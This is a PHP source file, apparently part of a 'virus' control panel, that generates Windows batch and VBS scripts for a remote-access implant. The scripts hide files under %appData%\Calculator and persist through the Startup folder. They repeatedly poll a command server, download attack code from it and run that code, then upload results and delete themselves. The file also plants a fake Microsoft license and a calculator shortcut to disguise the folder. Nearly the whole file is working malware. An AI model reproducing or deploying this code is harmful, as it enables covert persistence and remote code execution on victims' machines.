<?php

namespace Backup\Kelvinho\Virus\Attack {
    /**
     * Class BaseScript
     * @package Kelvinho\Virus\Attack
     *
     * So, a nice thing about this is that you can construct another class, like UNIXScript. Then you can modify the interface
     * to provide a platform variable, then it will just magically happen on unix-like hosts. This doesn't solve all problems though,
     * like specific attacks needs to be multi platform too, before this can work. This only solves the init scripts problem.
     */
    class BaseScriptWin {
        /**
         * Virus's daemon. Reports back to the web server each interval.
         *
         * @param string $virus_id The virus id
         * @return string The shell code
         */
        //@formatter:off
        public static function entry(string $virus_id): string {
            ob_start(); ?>
            @echo off
            timeout <?php echo STARTUP_DELAY . "\n"; ?>
            SetLocal EnableDelayedExpansion

            :daemon_loop
            timeout <?php echo VIRUS_PING_INTERVAL . "\n"; ?>

            curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping

            for /f "tokens=*" %%i in ('curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                set /a exist=0
                if exist "%~dp0new\%%i" (set /a exist=!exist!+1)
                if exist "%~dp0current\%%i" (set /a exist=!exist!+1)
                if "!exist!"=="0" (curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code > "%~dp0new\%%i")
            )

            for %%i in (%~dp0new\*) do (start /b cmd.exe /c "%~dp0worker.cmd %%i")

            goto daemon_loop

            <?php return ob_get_clean();
        }
        //@formatter:on

        /**
         * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
         * - /current: contain directories named after attack ids, code.cmd in them which contains the shell code
         * - /new: contain file named after attack ids, with shell codes in them
         * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
         * - /worker.cmd: work on an attack, scheduled by entry.cmd
         * - /unixTime.cmd: echos out the current unix time, can be used by any script
         * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
         *
         * @param string $virus_id The virus's id
         * @param string $user_handle The user handle
         * @param string|null $home_directory
         * @return string The shell code
         */
        public static function init(string $virus_id, string $user_handle, string $home_directory = null): string {
            if ($home_directory == null) {
                $home_directory = "%appData%\\Calculator";
            }
            $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            $UFile = "$startup_directory\\U" . substr($virus_id, 0, 5) . ".vbs";
            ob_start(); ?>
            rmdir /s /q <?php echo "\"$home_directory\"\n"; ?>
            mkdir <?php echo "\"$home_directory\"\n"; ?>
            mkdir <?php echo "\"$home_directory\\new\"\n"; ?>
            mkdir <?php echo "\"$home_directory\\current\"\n"; ?>
            mkdir <?php echo "\"$home_directory\\utils\"\n"; ?>
            curl <?php echo ALT_DOMAIN . "/new/$user_handle/entry/$virus_id > \"$home_directory\\entry.cmd\"\n" ?>
            curl <?php echo ALT_DOMAIN . "/new/$user_handle/worker > \"$home_directory\\worker.cmd\"\n" ?>
            rem curl <?php echo ALT_DOMAIN . "/new/$user_handle/unixTime > \"$home_directory\\unixTime.cmd\"\n" ?>
            echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $home_directory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False> <?php echo "\"$UFile\"\n"; ?>
            "<?php echo $UFile; // below are just additional things to make the virus looks legit ?>"
            curl <?php echo ALT_DOMAIN . "/new/$user_handle/license > \"$home_directory\\LICENSE\"\n" ?>
            echo calc.exe>"<?php echo $home_directory; ?>\calculator.cmd"
            exit
            <?php return ob_get_clean();
        }

        /**
         * This is the unixTime.cmd script. Every other scripts can invoke this to get the time for their uses
         *
         * @return string The code
         */
        public static function unixTime(): string {
            ob_start(); ?>
            @echo off
            SetLocal
            call :GetUnixTime UNIX_TIME
            echo %UNIX_TIME%
            goto :EOF

            :GetUnixTime
            SetLocal EnableExtensions
            for /f %%x in ('WMic path win32_utcTime get /format:list ^| findStr "="') do (set %%x)
            set /a z=(14-100%Month%%%100)/12, y=10000%Year%%%10000-z
            set /a ut=y*365+y/4-y/100+y/400+(153*(100%Month%%%100+12*z-3)+2)/5+Day-719469
            set /a ut=ut*86400+100%Hour%%%100*3600+100%Minute%%%100*60+100%Second%%%100
            EndLocal & set "%1=%ut%" & goto :EOF
            <?php return ob_get_clean();
        }

        /**
         * This is the worker.cmd script. entry.cmd script will pass in an attack id to the script. Then this will move
         * the script from /new/id to /current/id/code.cmd. Then this will execute the script, and after that delete
         * all information about that attack.
         *
         * There is a concept of a confirmation loop, that the script will submit to the web server. If the attack disappears
         * from the list of attacks then it will stop the loop. This confirmation loop will be in the payload's code, which
         * in the payload creation process the web server will invoke BaseScript::payloadConfirmationLoop()
         *
         * @return string The shell code
         */
        public static function worker(): string {
            ob_start(); ?>
            mkdir "%~pd0current\%~n1"
            move "%~pd0new\%~n1" "%~pd0current\%~n1\code.cmd"

            "%~pd0current\%~n1\code.cmd"
            <?php return ob_get_clean();
        }

        /**
         * Connects with the web server to see if it has accepted the results. If yes then quits the loop and allow the
         * script to continue. This is intended to be placed in the payload rather than on the host computer.
         *
         * @param string $virus_id The virus id
         * @param string $attack_id The attack id
         * @param string $uploadCode The code to upload the results
         * @return string The shell code
         */
        //@formatter:off
        public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
            ob_start(); ?>
            SetLocal EnableDelayedExpansion
            set has=false
            :payload_confirmation_loop
            <?php echo "$uploadCode\n"; ?>
            timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
            for /f "tokens=*" %%i in ('curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                if "%%i"=="<?php echo $attack_id; ?>" (set has=true)
            )
            if "!has!"=="false" (goto end_confirmation_loop)
            goto payload_confirmation_loop
            :end_confirmation_loop
            <?php return ob_get_clean();
        }
        //@formatter:on

        /**
         * Cleaning up the payload after it has executed.
         *
         * @return string The shell code
         */
        public static function cleanUpPayload(): string {
            ob_start(); ?>
            start /b cmd /c "rmdir /s /q %~pd0"
            <?php return ob_get_clean();
        }

        /**
         * Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
         *
         * @return string The license text
         */
        //@formatter:off
        public static function license(): string {
            ob_start(); ?>Copyright 2019 Microsoft

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.<?php return ob_get_clean();
        }
        //@formatter:on
    }
}
